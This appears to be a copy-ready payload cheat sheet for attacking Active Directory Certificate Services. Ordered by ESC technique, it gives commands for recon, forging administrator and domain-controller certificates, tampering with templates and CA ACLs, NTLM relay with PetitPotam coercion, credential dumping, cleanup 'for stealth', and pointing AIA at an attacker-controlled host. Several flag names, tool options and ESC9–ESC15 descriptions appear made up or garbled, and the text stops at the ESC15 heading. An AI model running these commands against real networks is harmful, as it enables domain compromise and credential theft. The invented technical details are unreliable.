# Active Directory Certificate Services (AD CS) Abuse Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for AD CS attack testing by ESC pattern and abuse class.
> Purpose: Quickly find commands for a specific ESC technique, ready to copy for testing.
> All payloads are for **authorized security testing only**. Frame every command within a signed statement of work and an explicit engagement window.

---

## Index

1. [PKI Reconnaissance and CA Discovery](#1-pki-reconnaissance-and-ca-discovery)
2. [Template Enumeration and ESC Classification](#2-template-enumeration-and-esc-classification)
3. [ESC1 -- SubjectAltName (SAN) Abuse](#3-esc1----subjectaltname-san-abuse)
4. [ESC2 -- AnyPurpose or No EKU Abuse](#4-esc2--anypurpose-or-no-eku-abuse)
5. [ESC3 -- PKINIT KDC / Any Client Cert Chain](#5-esc3--pkinit-kdc--any-client-cert-chain)
6. [ESC4 -- Template ACL Abuse (WriteDacl)](#6-esc4--template-acl-abuse-writedacl)
7. [ESC5 -- CA-Level ACL Abuse](#7-esc5--ca-level-acl-abuse)
8. [ESC6 -- EDITF_ATTRIBUTESUBJECTALTSSUBJECT2 (CA Flag)](#8-esc6--editf_attributesubjectaltsubject2-ca-flag)
9. [ESC7 -- SubCA / ManageCA Abuse](#9-esc7--subca--manageca-abuse)
10. [ESC8 -- NTLM Relay to AD CS Web Enrollment](#10-esc8--ntlm-relay-to-ad-cs-web-enrollment)
11. [ESC9 -- SubjectSid = IssuerSid (No Security Extension)](#11-esc9--subjectsid--issuersid-no-security-extension)
12. [ESC10 -- Weak Certificate Mapping (Non-Universal Security)](#12-esc10--weak-certificate-mapping-non-universal-security)
13. [ESC11 -- Relay to ICPR (RPC over HTTP)](#13-esc11--relay-to-icpr-rpc-over-http)
14. [ESC12 -- MachineCertificateEdition](#14-esc12--machinecertificateedition)
15. [ESC13 -- Multi-Tenant Condition (Conditional Access)](#15-esc13--multi-tenant-condition-conditional-access)
16. [ESC14 -- AIA URL Manipulation](#16-esc14--aia-url-manipulation)
17. [ESC15 -- lua application EKU (CVE-2024-49019)](#17-esc15--lua-application-eku-cve-2024-49019)
18. [PetitPotam (CVE-2021-36942) Coercion](#18-petitpotam-cve-2021-36942-coercion)
19. [Coercer -- Multi-Method Coercion](#19-coercer--multi-method-coercion)
20. [Certifried (CVE-2022-26923)](#20-certifried-cve-2022-26923)
21. [Shadow Credentials (msDS-KeyCredentialLink)](#21-shadow-credentials-msds-keycredentiallink)
22. [Golden Certificate Forgery](#22-golden-certificate-forgery)
23. [PKINIT -- Cert to TGT Authentication](#23-pkinit--cert-to-tgt-authentication)
24. [Rubeus PKINIT on Windows Footholds](#24-rubeus-pkinit-on-windows-footholds)
25. [Kekeo PKINIT and Golden Cert](#25-kekeo-pkinit-and-golden-cert)
26. [X.509 Parsing with OpenSSL and certutil](#26-x509-parsing-with-openssl-and-certutil)
27. [Certify (GhostPack) Enumeration and Abuse](#27-certify-ghostpack-enumeration-and-abuse)
28. [PSPKIAudit / PSPKI Module](#28-pspkiaudit--pspki-module)
29. [ADCSPwn -- End-to-End ESC8 Automation](#29-adcspwn--end-to-end-esc8-automation)
30. [NDES / SCEP Abuse](#30-ndes--scep-abuse)
31. [Detection Evasion and Anti-Forensics](#31-detection-evasion-and-anti-forensics)
32. [Defensive Verification and Hardening](#32-defensive-verification-and-hardening)

---

## 1. PKI Reconnaissance and CA Discovery

### Discover Enterprise CAs via LDAP Configuration Partition

The Configuration partition of every domain in a forest shares the same CA objects. Querying `pKIEnrollmentService` reveals every Enterprise CA, its DNS host name, and the templates it publishes.

```bash
# Locate all Enterprise CAs in the forest
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(objectclass=pKIEnrollmentService)" cn dNSHostName certificateTemplates
```

```bash
# Discover CA certificates (used later for chain validation)
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(objectclass=certificationAuthority)" cn cACertificate
```

```bash
# Find NTAuthStore -- the store of CAs authorised to issue auth certs
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(objectclass=certificationAuthority)" cn cACertificate
```

### Probe Web Enrollment Endpoints

AD CS Web Enrollment is exposed at the `certsrv` IIS virtual directory. The presence of `Default.aspx` indicates an enabled enrollment endpoint.

```bash
# Basic reachability probe
curl -sk -I http://ca01.corp.local/certsrv/ | head -5

# Pull the Default.aspx page (will require auth)
curl -sk -L --ntlm -u 'CORP\\svc_ldap:Password123!' \
  http://ca01.corp.local/certsrv/default.asp
```

```bash
# Check the mscep_admin password endpoint (NDES) -- usually /certsrv/mscep/
curl -sk http://ca01.corp.local/certsrv/mscep/mscep.dll | head -10
```

### Identify CA Type and Roles

Enterprise CAs are integrated with AD (template-backed, published to AD). Standalone CAs are independent (no AD templates). The CA's `flags` attribute distinguishes them.

```bash
# Query the CA's msPKI-ConfigurationFlags to determine type
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=CA01,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(objectclass=pKIEnrollmentService)" cn flags displayName
```

```bash
# Identify CA roles via rpc (MS-ICPR) -- the ICertPassage RPC interface
rpcclient -U 'CORP\\svc_ldap%Password123!' ca01.corp.local \
  -c 'enumprivs' 2>&1 | head -20
```

### Discover via certutil on a Windows Foothold

```cmd
:: List all CAs in the forest (requires Windows foothold)
certutil -dump

:: List templates published on a specific CA
certutil -catemplates

:: View CA configuration
certutil -config \\CA01\CORP-CA01-CA -getconfig

:: Check the CA's EditFlags (relevant for ESC6)
certutil -config \\CA01\CORP-CA01-CA -getreg policy\\EditFlags
```

### pkiview.msc for GUI Health Check

```cmd
:: Launch pkiview.msc from a Windows foothold -- shows CA chain, AIA, CDP status
pkiview.msc
```

---

## 2. Template Enumeration and ESC Classification

### Certipy Find -- the Standard Enumeration

Certipy is the modern Python standard for AD CS enumeration. The `find` subcommand dumps all CAs, templates, and their ACLs.

```bash
# Full enumeration with vulnerable flag highlighting
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -vulnerable
```

```bash
# Output as text + JSON for offline analysis
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -text -json
```

```bash
# BloodHound-style output for attack path graphing
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -bloodhound
```

```bash
# Old BloodHound (v4) compatible format
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -old-bloodhound
```

### Filter for Specific ESC Classes

```bash
# Only show enabled templates
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -enabled
```

```bash
# Vulnerable-only filter
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -vulnerable -text | grep -B2 -A10 ESC1
```

### Manual LDAP Template Filter

```bash
# Templates with ENROLLEE_SUPPLIES_SUBJECT (0x1) -- ESC1 candidates
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(&(objectclass=pKICertificateTemplate)(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.803:=1))" \
  cn displayName
```

```bash
# Templates with Client Authentication EKU (1.3.6.1.5.5.7.3.2)
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap' -w 'Password123!' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(pKIExtendedKeyUsage=1.3.6.1.5.5.7.3.2)" \
  cn displayName pKIExtendedKeyUsage
```

```bash
# Templates with PKINIT KDC EKU (1.3.6.1.5.2.3.5) -- ESC3 candidates
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(pKIExtendedKeyUsage=1.3.6.1.5.2.3.5)" \
  cn displayName
```

### Reading Template ACLs

```bash
# Dump ACLs for a specific template (Python netaddr via ldeep)
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 \
  templates 'VulnTemplate'
```

```bash
# Resolve SIDs and ACEs via PowerShell from a Windows foothold
Get-ADObject -Filter {objectClass -eq 'pKICertificateTemplate'} -Properties Name, nTSecurityDescriptor |
  ForEach-Object { $_.nTSecurityDescriptor.Access | Where-Object {
    $_.ActiveDirectoryRights -match 'WriteDacl|WriteOwner|GenericAll|WriteProperty'
  }}
```

---

## 3. ESC1 -- SubjectAltName (SAN) Abuse

### Prerequisites

ESC1 requires four conditions on a single published template:

1. The template's `msPKI-Certificate-Name-Flag` includes `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (0x1) -- this means the requester can specify the Subject Alternative Name (SAN).
2. The template's `pKIExtendedKeyUsage` includes Client Authentication, PKINIT Client Auth, Smart Card Logon, or AnyPurpose.
3. The requester (or a group they're in) holds the enrollment right on the template.
4. Manager approval is **not** required (`msPKI-Enrollment-Flag` lacks `CT_FLAG_PEND_ALL_REQUESTS`).

### Identify ESC1 Templates via Certipy

```bash
# Find all ESC1 templates (Certipy auto-classifies)
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -vulnerable -text | grep -B2 -A15 'ESC1'
```

### Request a Certificate Impersonating administrator

```bash
# Standard ESC1 -- request a cert that authenticates as administrator
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'VulnTemplate' \
  -san 'administrator@corp.local'
```

```bash
# Use a DNS-style SAN (some DCs require dns vs upn depending on cert type)
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'VulnTemplate' \
  -dns 'dc01.corp.local'
```

```bash
# Request with both UPN and DNS (max flexibility)
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'VulnTemplate' \
  -upn 'administrator@corp.local' -dns 'dc01.corp.local'
```

### Verify the Issued Certificate

```bash
# Decode the PFX and inspect the SAN, EKU, and subject
openssl pkcs12 -in administrator.pfx -nocerts -nodes -passin pass: \
  | openssl x509 -text -noout | grep -A5 'Subject Alternative Name'
```

```bash
# Alternative: use certipy to parse the PFX
certipy cert -pfx administrator.pfx -nokey -out admin.pem
openssl x509 -in admin.pem -text -noout | head -60
```

### Authenticate with the Forged Certificate

```bash
# Convert PFX to TGT via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1
```

```bash
# Specify domain if not auto-detected
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1 -d corp.local
```

```bash
# Use the TGT with Impacket secretsdump
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass dc01.corp.local
```

### ESC1 with Certify (Windows / C#)

```cmd
:: Identify ESC1 templates from a Windows foothold
Certify.exe find /vulnerable /currentuser

:: Request a certificate with SAN=administrator
Certify.exe request /ca:CA01.corp.local\CORP-CA01-CA \
  /template:VulnTemplate /altname:administrator

:: Convert the PEM cert + key to PFX
Certify.exe cert2pfx admin.pem admin.key admin.pfx
```

---

## 4. ESC2 -- AnyPurpose or No EKU Abuse

### Conditions

ESC2 requires a template whose `pKIExtendedKeyUsage`:

- Is **empty** (no EKU), or
- Contains AnyPurpose OID `2.5.29.37.0`, or
- Contains Subordinate Certification Authority OID `2.5.29.37.0` (rare).

A no-EKU template is treated as unrestricted -- the resulting certificate is valid for any EKU the issuer chain permits.

### Identify ESC2 Templates

```bash
# Templates with empty pKIExtendedKeyUsage
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(&(objectclass=pKICertificateTemplate)(!(pKIExtendedKeyUsage=*)))" \
  cn displayName
```

```bash
# Templates with AnyPurpose EKU
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(pKIExtendedKeyUsage=2.5.29.37.0)" \
  cn displayName
```

### ESC2 Request -- Subordinate CA Forgery

```bash
# Request a certificate usable as a SubCA (when no EKU restricts)
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'NoEKUTemplate' \
  -upn 'administrator@corp.local'
```

### ESC2 -> ESC1 Chain

If the template also has `ENROLLEE_SUPPLIES_SUBJECT`, treat as ESC1 (more impactful). Otherwise, the cert can be used for any client-auth scenario in the trust chain.

```bash
# Use the ESC2 cert for Schannel auth to LDAP/S
certipy auth -pfx admin.pfx -ldap -dc-ip 10.10.0.1
```

---

## 5. ESC3 -- PKINIT KDC / Any Client Cert Chain

### ESC3 Scenario A -- Any Client Certificate

ESC3-A targets templates where any user can enroll for a "Client Authentication" certificate that can then be used to authenticate as that same user via PKINIT. This is functionally equivalent to ESC1 against oneself, but serves as a stepping stone.

### ESC3 Scenario B -- PKINIT KDC EKU

ESC3-B targets a template with the PKINIT KDC EKU (`1.3.6.1.5.2.3.5`). A certificate with this EKU can be used to authenticate *as a Domain Controller*. Combined with ESC1 (SAN control), this grants the attacker a DC machine identity -- and the ability to perform DCSync-class operations.

```bash
# Identify PKINIT KDC templates
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(pKIExtendedKeyUsage=1.3.6.1.5.2.3.5)" \
  cn displayName
```

```bash
# Request a KDC cert impersonating a DC (requires ESC1 too on the template)
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'KdcTemplate' \
  -san 'DC01$' -upn 'DC01$@corp.local'
```

```bash
# Use the DC cert for DCSync-equivalent access
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1 -ldap-shell
```

### ESC3 Scenario C -- Enrollment Agent Chain

ESC3-C abuses the Enrollment Agent right. A user with Enrollment Agent rights can request a certificate on behalf of another user.

```bash
# Request an Enrollment Agent cert
certipy req -u 'corp\enroll_agent' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'EnrollmentAgent'

# Use the EA cert to request on behalf of administrator
certipy req -u 'corp\enroll_agent' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'User' \
  -on-behalf-of 'CORP\\administrator' -pfx enroll_agent.pfx
```

---

## 6. ESC4 -- Template ACL Abuse (WriteDacl)

### Conditions

ESC4 occurs when a principal the attacker controls holds one of: `WriteOwner`, `WriteDacl`, `WriteProperty` on `msPKI-Certificate-Name-Flag`, `GenericAll`, or `GenericWrite` on a template. With write access, the attacker modifies the template to make it ESC1-equivalent, then enrolls.

### Save the Original Template State

```bash
# Dump current state for restore
certipy template -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -template 'WritableTemplate' -save-old
```

### Modify the Template to be ESC1-Equivalent

```bash
# Flip ENROLLEE_SUPPLIES_SUBJECT and add Client Auth EKU
certipy template -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -template 'WritableTemplate' \
  -configuration 'WritabeTemplate.json'
```

### Alternative: Modify via LDAP directly

```bash
# Use ldeep to flip the ENROLLEE_SUPPLIES_SUBJECT flag
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 \
  modify 'CN=WritableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
  msPKI-Certificate-Name-Flag 1
```

### Request the Modified Template

```bash
# Now request with SAN (template is ESC1-equivalent)
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'WritableTemplate' \
  -san 'administrator@corp.local'
```

### Restore the Template for Stealth

```bash
# Restore from the saved configuration
certipy template -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -template 'WritableTemplate' \
  -configuration 'WritableTemplate.json.old'
```

---

## 7. ESC5 -- CA-Level ACL Abuse

### Conditions

ESC5 is broad -- it covers ACL abuse on **any PKI-related AD object** other than a template. The most impactful targets are:

- The CA object itself (`pKIEnrollmentService`)
- The CA's RPC server security descriptor
- The `NTAuthCertificates` object
- The Certificate Templates container
- The Public Key Services container itself

### Enumerate CA ACLs

```bash
# Dump ACLs on the CA object via ldeep
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 \
  object 'CN=CA01,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' -a
```

### Modify CA ACLs

```bash
# Grant yourself ManageCA via ldeep
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 \
  modify_acl 'CN=CA01,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
  --add "CORP\\svc_ldap" "ManageCA,ManageCertificates"
```

### Abuse ManageCA to Flip EDITF (ESC6)

```bash
# Once you have ManageCA, flip the EDITF_ATTRIBUTESUBJECTALTSSUBJECT2 flag
certipy ca -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -add-edit-flag EDITF_ATTRIBUTESUBJECTALTSSUBJECT2
```

---

## 8. ESC6 -- EDITF_ATTRIBUTESUBJECTALTSSUBJECT2 (CA Flag)

### Conditions

ESC6 occurs when the CA itself has the `EDITF_ATTRIBUTESUBJECTALTSSUBJECT2` flag set. This CA-wide flag allows SANs on *any* template issued by that CA, regardless of whether the template has `ENROLLEE_SUPPLIES_SUBJECT`.

### Check the CA Flag

```bash
# Check EditFlags via Certipy
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -text | grep -A2 'EditFlags'

# Native Windows check
certutil -config \\CA01\CORP-CA01-CA -getreg policy\\EditFlags
```

### Exploit ESC6

```bash
# Any template with Client Auth EKU can now be ESC1-equivalent
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'User' \
  -san 'administrator@corp.local'
```

```bash
# Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1
```

### Post-Mitigation Caveat

After KB5005413 (August 2021) and the May 2022 KB5014754, ESC6 is heavily mitigated even when the flag is set. Strong certificate mapping enforcement rejects certificates whose SAN does not match the requester's `sAMAccountName` or `objectSid`. ESC6 is mostly useful against pre-2022 environments or environments still in Compatibility / Audit mode.

---

## 9. ESC7 -- SubCA / ManageCA Abuse

### Conditions

ESC7 occurs when a non-admin principal holds `ManageCA` (CA administrator) or `ManageCertificates` (Certificate Manager) rights on the CA.

### Enumerate ManageCA Holders

```bash
# Dump CA ACLs via Certipy
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -text | grep -B1 -A10 'Manage CA'
```

### Path A -- SubCA Issuance

A principal with ManageCA can issue certificates previously pending approval. More powerfully, they can act as a SubCA by importing the CA's certificate into their own store.

```bash
# Issue a previously-pending request
certipy ca -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -issue-request 123
```

### Path B -- Flip EDITF for ESC6

```bash
# Use ManageCA to enable ESC6-style SANs
certipy ca -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -add-edit-flag EDITF_ATTRIBUTESUBJECTALTSSUBJECT2

# Restart the CA service (may not always be necessary)
certipy ca -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -restart
```

### Path C -- Add Templates / Enable Disabled Template

```bash
# Enable a previously-disabled template
certipy ca -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -enable-template 'VulnTemplate'
```

---

## 10. ESC8 -- NTLM Relay to AD CS Web Enrollment

### Attack Chain Summary

1. Force a victim (typically a Domain Controller machine account) to authenticate to the attacker's listener.
2. Relay that NTLM authentication to the AD CS Web Enrollment HTTP endpoint (`http://<ca>/certsrv/certfnsh.asp`).
3. The CA issues a certificate authenticating as the relayed account.
4. Use the certificate via PKINIT to obtain a TGT as the impersonated account.
5. With DC$ impersonation, dump domain credentials.

### Terminal 1 -- Start ntlmrelayx Targeting AD CS

```bash
# Standard ESC8 relay to Web Enrollment
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template 'DomainController'
```

```bash
# Variant: use a User template (broader applicability)
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template 'User'
```

```bash
# Relay to multiple targets for redundancy
ntlmrelayx.py -tf targets.txt -smb2support --adcs \
  --template 'Machine'
```

### Terminal 2 -- Coerce Authentication via PetitPotam

```bash
# Anonymous PetitPotam coercion of the DC
python3 PetitPotam.py -u '' -p '' -d corp.local \
  10.10.0.100 10.10.0.1
# Where 10.10.0.100 = attacker relay IP, 10.10.0.1 = DC
```

```bash
# Authenticated PetitPotam (works on patched servers if creds are valid)
python3 PetitPotam.py -u 'svc_ldap' -p 'Password123!' -d corp.local \
  10.10.0.100 10.10.0.1
```

### Terminal 3 -- Extract and Use the Base64 PFX

```bash
# The relayed PFX is base64-encoded in the ntlmrelayx output
# Save it to a file
echo '<base64_pfx_from_ntlmrelayx>' | base64 -d > dc01.pfx

# Authenticate with PKINIT
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1
```

### Variant -- Relay to LDAPS (Schannel)

If AD CS is unavailable but the DC's LDAPS signing is misconfigured (rare on modern Windows), relay to LDAPS for an LDAP shell.

```bash
# Relay to LDAPS (requires SMB signing disabled on DC, very rare post-2019)
ntlmrelayx.py -t ldaps://dc01.corp.local -smb2support
```

### ESC8 Mitigation Check

```bash
# Confirm Web Enrollment Extended Protection (CBT) status
curl -sk -I --ntlm -u 'CORP\\svc_ldap:Password123!' \
  http://ca01.corp.local/certsrv/default.asp | grep -i 'WWW-Authenticate'
```

---

## 11. ESC9 -- SubjectSid = IssuerSid (No Security Extension)

### Conditions

ESC9 (also called "No Security Extension") is a logic flaw in how Windows maps certificate subjects to account SIDs, exposed in KB5005413 documentation. When `StrongCertificateBindingEnforcement` is set to `1` (Compatibility mode, the pre-November-2023 default), the certificate mapping is weak.

Specifically, ESC9 applies when:

1. The `StrongCertificateBindingEnforcement` registry value is `1` (not `2` Full Enforce), AND
2. The certificate has no `szOID_NT_PRINCIPAL_NAME` extension (no security extension), AND
3. The template's `msPKI-Certificate-Name-Flag` lacks `ENROLLEE_SUPPLIES_SUBJECT` (so ESC1 doesn't fire), but
4. The requester can supply a UPN that maps to another principal.

### Check StrongCertificateBindingEnforcement

```cmd
:: From a Windows foothold, query the Kerberos parameters
reg query HKLM\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters /v StrongCertificateBindingEnforcement
```

### ESC9 Exploit Pattern

ESC9 is typically exploited as a chained primitive -- it relaxes the binding so that ESC1-style impersonation works even on templates without `ENROLLEE_SUPPLIES_SUBJECT`, provided the target's UPN can be specified.

```bash
# Request a cert where the UPN field maps to another principal
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'WeakBindingTemplate' \
  -upn 'administrator@corp.local'
```

### Pair with ESC10

ESC9 often combines with ESC10 (where the issuerSid mapping is weak) to chain into privilege escalation.

---

## 12. ESC10 -- Weak Certificate Mapping (Non-Universal Security)

### Conditions

ESC10 is the broader class of "weak certificate mapping" issues documented in KB5005413. Two main sub-cases:

- **ESC10-A**: A certificate can be used to authenticate as any user whose UPN matches the certificate's UPN field (when strong mapping is not enforced).
- **ESC10-B**: A certificate issued to one principal can be used for another if their SIDs collide (rare but possible with SACL/DACL manipulation).

### Check the Strong Mapping Mode

```cmd
:: Check the on-DC mapping mode (1=Audit, 2=Enforce)
reg query HKLM\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters /v StrongCertificateBindingEnforcement
```

### ESC10-A -- UPN Collision

```bash
# If the attacker controls a user whose UPN matches another's (rare but possible in misconfigured AD),
# they can request a cert and auth as the second user
certipy req -u 'corp\clone_user' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'User'

# Auth -- certipy will use the UPN in the cert
certipy auth -pfx clone_user.pfx -dc-ip 10.10.0.1
```

### Mitigation

```cmd
:: Set to Full Enforce (2)
reg add HKLM\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters /v StrongCertificateBindingEnforcement /t REG_DWORD /d 2 /f
```

---

## 13. ESC11 -- Relay to ICPR (RPC over HTTP)

### Conditions

ESC11 is a variant of ESC8 that targets the **RPC** ICertPassage (ICPR) interface on the CA rather than HTTP Web Enrollment. Some environments disable Web Enrollment but leave ICPR exposed.

### Check for ICPR Exposure

```bash
# Probe for the ICPR RPC endpoint
rpcclient -U 'CORP\\svc_ldap%Password123!' ca01.corp.local \
  -c 'enumif' 2>&1 | grep -i 'ICertPassage'
```

```bash
# Or via impacket's rpcdump
python3 -m impacket.examples.rpcdump ca01.corp.local | grep -i cert
```

### ESC11 Relay Chain

```bash
# Relay to the ICPR endpoint (Impacket supports this)
ntlmrelayx.py -t rpc://ca01.corp.local -smb2support --rpc-mode ICPR \
  --ca CORP-CA01-CA
```

```bash
# Trigger coercion (same as ESC8)
python3 PetitPotam.py -u '' -p '' -d corp.local \
  10.10.0.100 10.10.0.1
```

### ESC11 Mitigation

```cmd
:: Enforce RPC encryption/sealing on the CA
certutil -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICSPREQUEST

:: Restart the CA service
net stop certsvc && net start certsvc
```

---

## 14. ESC12 -- MachineCertificateEdition

### Conditions

ESC12 (publish mid-2023) targets the `MachineCertificateEdition` template attribute. If a machine template has `MachineCertificateEdition = 0` (or is missing), it may issue User-edition certificates, which can then be used for user PKINIT auth.

### Identify ESC12 Templates

```bash
# Query templates for MachineCertificateEdition
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(objectclass=pKICertificateTemplate)" \
  cn displayName msPKI-Certificate-Name-Flag
```

### Exploit

```bash
# Request a User-edition cert from a Machine template
certipy req -u 'corp\\machine_acct$' -hashes :ntlmhash -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'BadMachineTemplate' \
  -upn 'administrator@corp.local'
```

---

## 15. ESC13 -- Multi-Tenant Condition (Conditional Access)

### Conditions

ESC13 applies when a certificate template's `msPKI-Certificate-Policy` references an issuance policy that is mapped via Group Policy to a high-privilege security group. The requester enrolls against the template and the resulting certificate carries the issuance policy OID; on presentation, Conditional Access on the resource grants them the high-privilege group's effective permissions.

### Enumerate Issuance Policies

```bash
# Find issuance policy OIDs
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(objectclass=msPKI-Enterprise-Oid)" cn msPKI-Cert-Application-Oid msPKI-Cert-Application-Oid-Localized
```

### Enumerate Group <-> Issuance Policy Mapping

```cmd
:: From a Windows foothold, check Group Policy issuance policy mapping
certutil -view -restrict "Disposition=20"
```

### Exploit ESC13

```bash
# Enroll against the template that grants the high-privilege policy
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'HighPrivilegePolicyTemplate'
```

```bash
# Auth -- the resulting certificate carries the issuance policy
certipy auth -pfx svc_ldap.pfx -dc-ip 10.10.0.1
```

---

## 16. ESC14 -- AIA URL Manipulation

### Conditions

ESC14 (Certipy 4.x release notes, 2023) targets the Authority Information Access (AIA) URL in a certificate. If an attacker controls the AIA URL (via ESC4 template modification or ESC5 CA ACL), they can craft a certificate whose AIA points to an attacker-controlled HTTP endpoint. When the relying party validates the cert chain, it fetches the intermediate cert from the attacker's server.

### Enumerate AIA Configuration

```bash
# Read the CA's AIA extension configuration
certutil -config \\CA01\CORP-CA01-CA -getreg CA\\AIA
```

### Set a Malicious AIA

```bash
# Modify the template's AIA to point to attacker-controlled server (requires ESC4)
certipy template -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -template 'WritableTemplate' \
  -aia 'http://attacker.example.com/cert.crt'
```

### Host the Fake Intermediate

```bash
# On the attacker's server, host a forged intermediate cert
python3 -m http.server 80
```

---

## 17. ESC15 -- lua application EKU (CVE-2024-49019)

### Conditions

